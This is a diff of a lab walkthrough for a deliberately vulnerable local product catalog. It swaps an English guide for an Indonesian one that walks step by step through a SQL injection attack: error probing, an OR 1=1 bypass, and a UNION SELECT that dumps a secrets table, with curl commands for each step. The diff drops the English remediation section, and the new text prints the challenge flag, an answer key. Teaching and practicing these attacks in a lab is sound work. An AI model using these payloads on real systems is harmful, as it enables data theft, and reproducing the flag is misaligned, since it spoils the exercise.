@@ -1,91 +1,85 @@
-# Practice Walkthrough: UNION-Based SQL Injection & Schema Exfiltration
+# Panduan Praktik Terbimbing: Eksploitasi SQL Injection pada MegaStore Global
 
-This walkthrough adheres to the 4-Tier Mission Progression methodology, balancing **60% manual analytical techniques** and **40% command-line tooling**:
-
----
-
-## Tier 1: Attack Surface Observation (Weight: 15%)
-
-1. **Verify Lab Container Readiness**:
-   Open your browser and navigate to the lab target:
-   `http://127.0.0.1:8015`
-
-2. **Inspect Normal Application Operations**:
-   - Examine the *Central Logistics Hardware Catalog* dashboard.
-   - Enter `Server` in the product search box and click **Search**.
-   - **Observation**: The table renders matching inventory records (`Rackmount Server 2U`, Category: `Hardware`, Price: `$3499.5`).
-   - Notice the table layout projects exactly **3 distinct columns**: `Product Name`, `Category`, and `Price (USD)`.
+Dalam latihan terarah ini, kamu akan mempraktikkan proses penemuan celah, pengujian error, dan eksploitasi kerentanan SQL Injection pada portal katalog produk **MegaStore Global (Commercial E-Commerce & Retail Inventory Portal)** yang beroperasi pada `http://127.0.0.1:8015`.
 
 ---
 
-## Tier 2: Endpoint Discovery & Syntax Breakout (Weight: 25%)
-
-1. **Test String Delimiter Breakout**:
-   In the search field, input a single apostrophe (`'`):
-   ```text
-   '
+### Langkah 1: Observasi Antarmuka & Uji Ketersediaan Layanan
+1. Pastikan target lab telah berjalan dan uji ketersediaan layanan melalui terminal:
+   ```bash
+   curl -s http://127.0.0.1:8015/health
    ```
-   Click **Search** and examine the response.
-
-2. **Analyze Database Exception Feedback**:
-   The web UI reflects an internal database exception:
-   ```text
-   Database Error:
-   unrecognized token: "'%"
+   *Respons yang diharapkan:*
+   ```json
+   {"lab":"A05","port":8015,"status":"ok"}
    ```
-   *Analysis Takeaway*: The query processor concatenated user input directly into SQLite syntax without escaping. The unpaired quote broke the query string delimiter!
-
-3. **Verify Projected Column Count**:
-   Deploy an incremental `UNION SELECT` probe:
-   - Input the payload:
-     ```text
-     ' UNION SELECT 1, 2, 3 --
-     ```
-   - **Observation**: The catalog table successfully renders an extra row with values `1`, `2`, and `$3.0`. This conclusively proves that the original query returns exactly **3 columns**.
+2. Buka peramban web dan akses halaman beranda MegaStore Global:
+   `http://127.0.0.1:8015/`
+3. Amati antarmuka katalog:
+   - Terdapat kolom pencarian produk dengan placeholder *"Search products..."* dan tombol **"Search Inventory"**.
+   - Di bawahnya terdapat tabel daftar inventaris barang yang menampilkan 3 kolom informasi: **Product Name**, **Category**, dan **Price**.
 
 ---
 
-## Tier 3: Schema Enumeration & Vault Exfiltration (Weight: 35%)
-
-1. **Enumerate Database Tables (sqlite_master)**:
-   Query SQLite's internal metadata catalog to discover database tables:
-   ```text
-   ' UNION SELECT tbl_name, sql, 0 FROM sqlite_master WHERE type='table' --
+### Langkah 2: Pengujian Input & Deteksi Error SQL (Fuzzing)
+1. Pada kotak pencarian produk di antarmuka web, ketikkan karakter kutip tunggal:
+   `'`
+2. Klik tombol **"Search Inventory"** atau kirimkan via terminal:
+   ```bash
+   curl -s "http://127.0.0.1:8015/?q=%27"
    ```
-   Click **Search** and inspect the table results:
-   - Public table: `products`.
-   - Hidden high-value table: `vault_secrets` with schema `(id INTEGER, secret_name TEXT, secret_data TEXT)`.
-
-2. **Exfiltrate Vault Records**:
-   Construct the targeted UNION payload to project `secret_name` and `secret_data`:
+3. **Temuan Kritis:**
+   Server menampilkan kotak pesan error basis data berwarna merah:
    ```text
-   ' UNION SELECT secret_name, secret_data, 0 FROM vault_secrets --
+   Internal Database Exception: unrecognized token: "'%'"
    ```
+   Pesan ini mengonfirmasi secara pasti bahwa karakter kutip tunggal yang kamu kirimkan berhasil merusak sintaks query SQL backend!
 
-3. **Recover the Authorization Key**:
-   The catalog table renders the exfiltrated vault record:
-   - **Product Name**: `PROJECT_ZITERA_CORE_FLAG`
-   - **Category**: Displays the master secret flag formatted as `FLAG: ZITERA{...}`.
-   - Copy the recovered flag token from the screen and submit it in the **Challenge** tab.
+> [!NOTE]
+> **💡 Di Balik Layar: Mengapa pesan error muncul?**  
+> Di sisi server, kode Python mengeksekusi query dengan menyambungkan string mentah:  
+> `SELECT name, category, price FROM products WHERE name LIKE '%{q}%'`  
+> Saat kamu memasukkan `'`, query berubah menjadi:  
+> `... WHERE name LIKE '%'%'`  
+> Tanda kutip ketiga tidak memiliki pasangan penutup, sehingga parser SQLite mengalami kebingungan sintaks dan memuntahkan error!
 
 ---
 
-## Tier 4: Defensive Verification & Remediation Hardening (Weight: 25%)
-
-1. **Verify Vulnerability Behavior via cURL**:
-   Execute an automated test against the unhardened endpoint using cURL:
+### Langkah 3: Menyeimbangkan Query & Menguji Injeksi Logika Boolean
+1. Untuk membuktikan bahwa kita bisa mengendalikan alur query, kita harus menutup string secara rapi dan menetralkan sisa karakter menggunakan tanda komentar (`--`):
+   `' OR 1=1 --`
+2. Masukkan payload tersebut ke kolom pencarian atau jalankan perintah cURL:
    ```bash
    curl -s "http://127.0.0.1:8015/?q=%27+OR+1%3D1+--"
    ```
-   *Vulnerable state*: The response body dumps the entire product database.
+3. **Hasil:** Seluruh daftar produk di database ditampilkan di layar tanpa ada pesan error. Kondisi `1=1` selalu bernilai benar (*true*).
 
-2. **Refactor to Parameterized Query**:
-   In the backend controller (`app.py`), replace raw f-strings with a parameterized prepared statement:
-   ```python
-   # Secure Implementation: Bind user data separately
-   c.execute("SELECT name, category, price FROM products WHERE name LIKE ?", (f"%{query}%",))
+---
+
+### Langkah 4: Menentukan Jumlah Kolom & Menjalankan UNION Injection
+Teknik `UNION SELECT` memungkinkan kita menggabungkan hasil pencarian dengan data dari tabel lain. Syarat mutlak `UNION` adalah jumlah kolom dan tipe data harus sesuai dengan query asli (3 kolom):
+
+1. Uji baris data tiruan menggunakan 3 kolom:
+   `' UNION SELECT 'TIRUAN', 'KATEGORI_TEST', 999 --`
+2. Perhatikan tabel inventaris di browser: Muncul baris produk baru bernama *"TIRUAN"* dengan kategori *"KATEGORI_TEST"* dan harga *$999.00*.
+3. Sekarang, ganti data tiruan tersebut dengan nama kolom dari tabel rahasia `vault_secrets`:
+   - Kolom 1: `secret_name`
+   - Kolom 2: `secret_data`
+   - Kolom 3: angka `0` (untuk mengisi kolom harga)
+4. Susun payload lengkap:
+   `' UNION SELECT secret_name, secret_data, 0 FROM vault_secrets --`
+
+---
+
+### Langkah 5: Eksfiltrasi Flag Rahasia
+1. Masukkan payload di atas ke kotak pencarian web atau jalankan via cURL:
+   ```bash
+   curl -s "http://127.0.0.1:8015/?q=%27+UNION+SELECT+secret_name%2C+secret_data%2C+0+FROM+vault_secrets+--"
    ```
-
-3. **Confirm Definitive Remediation**:
-   Re-test with payload `'` or `' OR 1=1 --`. The database engine treats delimiters strictly as inert string literals, returning clean zero-match messages:
-   *"No inventory items found matching your query."*
+2. **Temuan Kunci pada Baris Tabel:**
+   - **Product Name:** `PROJECT_ZITERA_CORE_FLAG`
+   - **Category:** `FLAG: ZITERA{5q1_1nj3ct10n_m45t3r_2026}`
+   - **Price:** `$0.00`
+3. Salin bendera validasi autoritatif:
+   `ZITERA{5q1_1nj3ct10n_m45t3r_2026}`
+4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
